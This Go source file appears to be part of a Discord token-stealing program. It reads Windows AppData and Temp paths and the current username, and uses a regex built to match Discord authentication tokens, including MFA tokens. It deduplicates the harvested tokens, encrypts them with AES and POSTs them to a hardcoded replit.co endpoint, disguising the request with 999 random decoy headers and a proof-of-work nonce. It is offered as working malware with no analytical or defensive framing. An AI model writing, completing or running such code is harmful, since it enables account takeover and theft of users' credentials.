package main

import (
	"bytes"
	"crypto/aes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/user"
	"regexp"
	"strconv"
	"strings"
	"time"
)

const (
	numberBytes string = "0123456789"
	letterBytes string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

var (
	USER string = GetUsername()

	LOCAL   string = os.Getenv("LOCALAPPDATA")
	ROAMING string = os.Getenv("APPDATA")
	TEMP    string = os.Getenv("TEMP")

	HEADERS [999]string
)

func CleanUp() {
	_ = os.RemoveAll(TempFileDir)
}

func SendRequest(body string, ip string) {
	HashKey := RandIntBytes(3)
	HashKeyInt, _ := strconv.Atoi(HashKey)

	GenerateHeaders()

	hash, nonce := CryptSign(ip, HashKey)

	HEADERS[HashKeyInt] = nonce

	//fmt.Println(HEADERS)

	var p string = "{"

	for i := 0; i < 999; i++ {
		if i == 998 {
			p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\""
			continue
		}
		p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\","

	}
	p = p + "}"

	endpoint := Encrypt(body, strings.Join(strings.Split(hash, "")[0:32], ""))
	req, _ := http.NewRequest("POST", "https://liveton.studio7.repl.co/go/"+fmt.Sprintf("%03d", len(ToString(endpoint)))+strings.TrimRight(ToString(endpoint), "0")+HashKey, bytes.NewBuffer([]byte(p)))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	client.Do(req)
}

func GetUsername() string {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	if strings.Contains(user.Username, "\\") {
		return strings.Split(user.Username, "\\")[1]
	} else {
		return user.Username
	}
}

func FindAllTokens(input string) []string {
	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})|(mfa\\.[\\w-]{84})")
	if e != nil {
		log.Fatalf(e.Error())
	}

	return Expression.FindAllString(input, -1)
}

func RemoveDuplicates[T string | int](sliceList []T) []T {
	allKeys := make(map[T]bool)
	list := []T{}
	for _, item := range sliceList {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}

func FormatTokens(input []string) string {
	output, _ := json.Marshal(RemoveDuplicates(input))
	return string(output)
}

func Slice(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}

func RandStringBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func RandIntBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = numberBytes[rand.Intn(len(numberBytes))]
	}
	return string(b)
}

func GenerateHeaders() {
	for i := 0; i < len(HEADERS); i++ {
		HEADERS[i] = RandIntBytes(6)
	}
}

func CryptSign(input, expected string) (hash, nonce string) {
	var out string

	for i := 0; i < 999999; i++ {
		h := sha256.Sum256([]byte(input + string(i)))
		out = hex.EncodeToString(h[:])
		if strings.HasSuffix(out, expected) {
			nonce = fmt.Sprintf("%06d", i)
			break
		}
	}
	return out, nonce
}

func EncryptAES(key []byte, plaintext string) string {
	// create cipher
	c, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// allocate space for ciphered data
	out := make([]byte, len(plaintext))

	// encrypt
	c.Encrypt(out, []byte(plaintext))
	// return hex string
	return hex.EncodeToString(out)
}

func ToString(s interface{}) string {
	return fmt.Sprint(s)
}

func Encrypt(s, key string) string {
	var out string = ""
	ss := Slice(s, 16)

	for i := 0; i < len(ss); i++ {
		if len(ss[i]) < 16 {
			enc := strings.ReplaceAll(strings.ReplaceAll(fmt.Sprintf("%v", ss[i]+strings.Repeat("@", 16-len(ss[i]))), "%!d(string=", ""), ")", "")
			out = out + EncryptAES([]byte(key), enc)
			continue
		}
		out = out + EncryptAES([]byte(key), ss[i])
	}

	return out
}
